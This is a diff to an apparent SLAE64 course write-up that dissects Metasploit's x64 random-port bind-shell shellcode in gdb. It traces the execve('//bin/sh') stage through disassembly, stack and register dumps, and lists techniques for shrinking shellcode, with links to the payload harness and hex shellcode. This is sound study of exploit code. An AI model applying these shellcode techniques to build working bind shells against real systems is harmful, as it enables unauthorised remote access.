@@ -479,36 +479,97 @@ This means that `execve` will execute the hardcoded command `//bin/sh`. And this
 - RDI: The memory address for the `//bin/sh` string
 - RSI: The pointer to the memory address containing the address of the parameters. As no parameters are needed or used, simply gets the NULL value "0x00"
 - RDX: NULL value, "0x00"
-The Stack Technique is used, hence will need to review the values pushed in the stack. `stepi`'ing and following the code, the stack contents just before the syscall should be:
+The Stack Technique is used, hence will need to review the values pushed in the stack before the syscall and the registers contents. `stepi`'ing and following the code, and stop just before the syscall:
+
 ```asm
+(gdb) disassemble 
+Dump of assembler code for function code:
+**_REMOVED__**
+=> 0x0000555555558087 <+39>:	push   rdx
+   0x0000555555558088 <+40>:	movabs rdi,0x68732f6e69622f2f
+   0x0000555555558092 <+50>:	push   rdi
+   0x0000555555558093 <+51>:	push   rsp
+   0x0000555555558094 <+52>:	pop    rdi
+   0x0000555555558095 <+53>:	mov    al,0x3b
+   0x0000555555558097 <+55>:	syscall 
+End of assembler dump.
+(gdb) stepi                                        <== Executes push rdx
+0x0000555555558088 in code ()
+(gdb) x/xg $rsp
+0x7fffffffe750:	0x0000000000000000                 <== RDX is Pushed. RDX had 0x00 value from +3
+(gdb) stepi                                        <== Executes movabs rdi,"//bin/sh"
+0x0000555555558092 in code ()
+(gdb) stepi                                        <== Pushes String to Stack. Executes push rdi
+0x0000555555558093 in code ()
+(gdb) x/s $rsp                                     <== Check top of the stack
+0x7fffffffe748:	"//bin/sh"                         <== The string is in the stack
+(gdb) stepi                                        <== Pushes the address of //bin/sh string into 
+0x0000555555558094 in code ()                       == the stack. Executes push rsp
+(gdb) stepi                                        <== RDI <- @ //bin/sh string. Executes pop rdi
+0x0000555555558095 in code ()
+(gdb) stepi
+0x0000555555558097 in code ()
+(gdb) 
+```
+Now the **RIP** is pointing to the `syscall` instruction. Let's stop here. The stack contents for what's been just debuged should be:
+```asm
+  Stack Address          Stack Content        
+|------------------|------------------------|
+|  0x7fffffffe748  |   "//bin/sh"           | 
+|  0x7fffffffe750  |   0x0000000000000000   |
+|-------------------------------------------|
+```
+Let's check that's ok:
+```asm
+(gdb) x/2xg $rsp
+0x7fffffffe748:	0x68732f6e69622f2f	0x0000000000000000
+(gdb) 
+```
+Hence, RSI should have the **`0x7fffffffe748`** as per the instruction executed at +52:
+```asm
+(gdb) info registers rdi
+rdi            0x7fffffffe748      140737488349000
+(gdb) x/s $rdi
+0x7fffffffe748:	"//bin/sh"
+(gdb) 
+```
+And RSI and RDX should have NULL values as no parameters are passed to the function:
+```asm
+(gdb) info registers rsi rdx
+rsi            0x0                 0
+rdx            0x0                 0
+(gdb) 
+```
+#### The End 
+Ok, all looks as it was expected. After `stepi` into the syscall, the shell will be spawned in our `netcat` session that we had to open to continue debugging in the previous sections:
+```asm
+(gdb) stepi
+process 1513 is executing new program: /usr/bin/dash
+(gdb) 
+```
+With the expected results:
 
+<img src="https://galminyana.github.io/img/A052_Shellcode_End.png" width="75%" height="75%">
 
+> However, didnt came this following question to you? Where is the code to generate the random port number? This is answered below
 
+### Thoughts
+---
+From this analysis, some tricks been learned:
 
+- No need to use the `sys_bind` syscall. As the code did not use it, researched about why not being used, and came up with a comment at StackOverflow. There are some posts that says that if a TCP or UDP socket is being used, the kernel will automatically bind the socket to a suitable port number. **This also the way that the payload uses to generate the random port!**. As the kernel defines a random port and binds it to the connection, the code to create a random port is not needed and reduces considerably the shellcode size.
+- When using the `sys_accept`, no value it returns in the sockaddr struct will be used. Researching reading the man page further, in the thirth paragraph of the Description section, says that _"When addr is NULL, nothing is filled in; in this case, addrlen is not used, and should also be NULL."_. Not having to do all this work saves us time and shellcode size.
+- When the command to be executed by `sys_execve` does not have any parameter, the second and thirth parameter can be NULL. Then only the command is executed without parameters.
+- The use of the `mul` instruction to initialize to "0x00" the value of RAX and RDX registers at the same time.
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+With this learnings, will have to review the payloads created in the [Assignment01](Assignment01) and [Assignment02](Assignment02) applying this learned techniques to make their shellcode size reduced.
 
 ### GitHub Repo Files
 ---
 The [GitHub Repo](https://github.com/galminyana/SLAE64/tree/main/Assignment05) for this assignment contains the following files:
 
-- [Payload_01.c](https://github.com/galminyana/SLAE64/blob/main/Assignment05/Payload_01.c) : The C file cloned from `shellcode.c` to execute the `linux/x64/exec` shellcode.
-- [Shellcode_01.txt](https://github.com/galminyana/SLAE64/blob/main/Assignment05/Shellcode_01.txt) : The rax shellcode in hex into a text file.
+- [Payload_02.c](https://github.com/galminyana/SLAE64/blob/main/Assignment05/Payload_02.c) : The C file cloned from `shellcode.c` to execute the `linux/x64/shell_bind_tcp_random_port` shellcode.
+- [Shellcode_02.txt](https://github.com/galminyana/SLAE64/blob/main/Assignment05/Shellcode_02.txt) : The rax shellcode in hex into a text file.
 
 ### The End
 ---
